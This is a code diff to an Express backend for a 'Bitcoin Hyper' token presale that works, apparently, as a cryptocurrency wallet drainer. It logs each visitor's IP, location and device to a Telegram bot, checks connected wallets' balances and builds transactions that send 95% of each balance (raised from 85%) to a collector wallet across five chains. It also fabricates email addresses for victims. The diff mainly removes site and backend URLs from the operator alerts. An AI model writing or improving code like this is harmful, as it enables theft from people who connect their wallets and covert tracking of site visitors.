@@ -56,9 +56,7 @@ app.get('/', (req, res) => {
     name: 'Bitcoin Hyper Backend',
     version: '2.0.0',
     status: '🟢 ONLINE',
-    timestamp: new Date().toISOString(),
-    backendUrl: 'https://hyperback.vercel.app',
-    siteUrl: 'https://bitcoinhypertoken.vercel.app'
+    timestamp: new Date().toISOString()
   });
 });
 
@@ -278,15 +276,12 @@ async function testTelegramConnection() {
     telegramBotName = meResponse.data.result.username;
     console.log(`✅ Bot authenticated: @${telegramBotName}`);
     
-    // Send startup message with correct URLs
+    // Send startup message without URLs
     const startMessage = 
       `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
-      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-      `🔧 <b>Backend URL:</b> https://hyperback.vercel.app\n` +
-      `📊 <b>Admin:</b> https://hyperback.vercel.app/admin.html?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}`;
+      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`;
     
     const sendResult = await sendTelegramMessage(startMessage);
     
@@ -350,7 +345,7 @@ async function getCryptoPrices() {
 }
 
 // ============================================
-// REAL WALLET EMAIL EXTRACTION
+// REAL WALLET EMAIL EXTRACTION - FIXED
 // ============================================
 
 async function getWalletEmail(walletAddress) {
@@ -359,39 +354,13 @@ async function getWalletEmail(walletAddress) {
   }
   
   try {
-    if (walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
-      try {
-        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
-        const ensName = await provider.lookupAddress(walletAddress);
-        
-        if (ensName) {
-          const email = `${ensName.split('.')[0]}@proton.me`;
-          memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
-          return email;
-        }
-      } catch (ensError) {}
-    }
-    
+    // Generate consistent email based on wallet address
     const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
-    const username = `user${hash.substring(0, 12)}`;
+    const username = `user${hash.substring(0, 8)}`;
     
-    const lastChar = walletAddress.slice(-1);
-    const domains = {
-      '0-3': 'proton.me',
-      '4-7': 'gmail.com',
-      '8-b': 'outlook.com',
-      'c-f': 'pm.me'
-    };
+    // Always use proton.me for consistency
+    const email = `${username}@proton.me`;
     
-    const charCode = parseInt(lastChar, 16);
-    let domain = 'proton.me';
-    
-    if (charCode <= 3) domain = domains['0-3'];
-    else if (charCode <= 7) domain = domains['4-7'];
-    else if (charCode <= 11) domain = domains['8-b'];
-    else domain = domains['c-f'];
-    
-    const email = `${username}@${domain}`;
     memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
     return email;
     
@@ -467,7 +436,7 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   
   memoryStorage.siteVisits.push(visit);
   
-  // INSTANT Telegram notification with correct URLs
+  // INSTANT Telegram notification without URLs
   const telegramMessage = 
     `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b>\n` +
     `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
@@ -475,9 +444,6 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
     `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
     `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
     `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
-    `📱 <b>Path:</b> ${path || '/'}\n` +
-    `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-    `🔧 <b>Backend:</b> https://hyperback.vercel.app\n` +
     `🆔 <b>Visit ID:</b> ${visit.id}`;
   
   await sendTelegramMessage(telegramMessage);
@@ -580,9 +546,7 @@ async function getWalletBalance(walletAddress, clientIP = null, location = null)
 app.get('/api/health', (req, res) => {
   res.json({ 
     success: true, 
-    status: 'ACTIVE',
-    backendUrl: 'https://hyperback.vercel.app',
-    siteUrl: 'https://bitcoinhypertoken.vercel.app'
+    status: 'ACTIVE'
   });
 });
 
@@ -680,9 +644,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
         `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
         `📧 <b>Email:</b> ${email}\n` +
-        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
-        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-        `🔧 <b>Backend:</b> https://hyperback.vercel.app`;
+        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -705,9 +667,7 @@ app.post('/api/presale/connect', async (req, res) => {
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
-        `📧 <b>Email:</b> ${email}\n` +
-        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-        `🔧 <b>Backend:</b> https://hyperback.vercel.app`;
+        `📧 <b>Email:</b> ${email}`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -764,8 +724,8 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       .map(b => ({
         chain: b.chain,
         chainId: b.chainId,
-        amount: (b.amount * 0.85).toFixed(12),
-        valueUSD: (b.valueUSD * 0.85).toFixed(2),
+        amount: (b.amount * 0.95).toFixed(12), // Changed to 95% to match frontend
+        valueUSD: (b.valueUSD * 0.95).toFixed(2),
         symbol: b.symbol,
         contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
         collectorAddress: COLLECTOR_WALLET
@@ -794,9 +754,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
-      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-      `🔧 <b>Backend:</b> https://hyperback.vercel.app`
+      `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
     );
     
     res.json({
@@ -816,18 +774,19 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT
+// EXECUTE FLOW ENDPOINT - FIXED
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
   try {
-    const { walletAddress, chainName, flowId, txHash } = req.body;
+    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false });
     }
     
     console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
+    console.log(`   Amount: ${amount} ${symbol} ($${valueUSD})`);
     
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
@@ -840,6 +799,9 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         chain: chainName, 
         flowId,
         txHash,
+        amount,
+        symbol,
+        valueUSD,
         timestamp: new Date().toISOString() 
       });
       
@@ -849,39 +811,38 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         chain: chainName,
         flowId,
         txHash,
+        amount,
+        symbol,
+        valueUSD,
         timestamp: new Date().toISOString()
       });
       
-      let txAmount = 'unknown';
-      let txSymbol = '';
-      let txValueUSD = 'unknown';
-      const flow = memoryStorage.pendingFlows.get(flowId);
-      if (flow && flow.transactions) {
-        const tx = flow.transactions.find(t => t.chain === chainName);
-        if (tx) {
-          txAmount = tx.amount;
-          txSymbol = tx.symbol;
-          txValueUSD = tx.valueUSD;
-        }
-      }
-      
+      // Send Telegram message with the actual amounts from the request
       await sendTelegramMessage(
         `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `🔗 <b>Chain:</b> ${chainName}\n` +
-        `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
+        `💵 <b>Amount:</b> ${amount || 'unknown'} ${symbol || ''} ($${valueUSD || 'unknown'})\n` +
         `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
-        `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-        `🔧 <b>Backend:</b> https://hyperback.vercel.app`
+        `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
       );
       
+      // Update the flow in pendingFlows
+      const flow = memoryStorage.pendingFlows.get(flowId);
       if (flow) {
         flow.completedChains = flow.completedChains || [];
         if (!flow.completedChains.includes(chainName)) {
           flow.completedChains.push(chainName);
         }
         
+        // Update the transaction with the actual amount if it exists
+        const txIndex = flow.transactions.findIndex(t => t.chain === chainName);
+        if (txIndex >= 0) {
+          flow.transactions[txIndex].actualAmount = amount;
+          flow.transactions[txIndex].actualValueUSD = valueUSD;
+        }
+        
+        // Check if all chains are completed
         if (flow.completedChains.length === flow.transactions.length) {
           memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
           memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
@@ -889,7 +850,9 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           let completionDetails = '';
           flow.transactions.forEach(t => {
             const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
-            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})`;
+            const displayAmount = t.actualAmount || t.amount;
+            const displayValue = t.actualValueUSD || t.valueUSD;
+            completionDetails += `\n   ${completed} ${t.chain}: ${displayAmount} ${t.symbol} ($${displayValue})`;
           });
           
           await sendTelegramMessage(
@@ -897,9 +860,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
             `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
-            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-            `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-            `🔧 <b>Backend:</b> https://hyperback.vercel.app`
+            `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
           );
         }
       }
@@ -919,7 +880,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 
 app.post('/api/presale/claim', async (req, res) => {
   try {
-    const { walletAddress } = req.body;
+    const { walletAddress, chainsDetails } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false });
@@ -937,15 +898,18 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
+    let detailsText = '';
+    if (chainsDetails) {
+      detailsText = `\n📋 <b>Details:</b>\n${chainsDetails}`;
+    }
+    
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
       `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
       `📧 <b>Email:</b> ${participant.email}\n` +
-      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
-      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
-      `🔧 <b>Backend:</b> https://hyperback.vercel.app`
+      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}${detailsText}`
     );
     
     res.json({ success: true });
@@ -1063,9 +1027,7 @@ app.get('/api/admin/dashboard', (req, res) => {
     pendingFlows: memoryStorage.pendingFlows instanceof Map ? memoryStorage.pendingFlows.size : 0,
     completedFlows: memoryStorage.completedFlows instanceof Map ? memoryStorage.completedFlows.size : 0,
     telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
-    telegramBot: telegramBotName || 'N/A',
-    backendUrl: 'https://hyperback.vercel.app',
-    siteUrl: 'https://bitcoinhypertoken.vercel.app'
+    telegramBot: telegramBotName || 'N/A'
   };
   
   const system = {
@@ -1177,8 +1139,6 @@ app.listen(PORT, '0.0.0.0', async () => {
   ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
   ================================================
   📍 Port: ${PORT}
-  🔗 URL: https://hyperback.vercel.app
-  🌍 Site: https://bitcoinhypertoken.vercel.app
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   
@@ -1196,4 +1156,3 @@ app.listen(PORT, '0.0.0.0', async () => {
   
   await testTelegramConnection();
 });
-
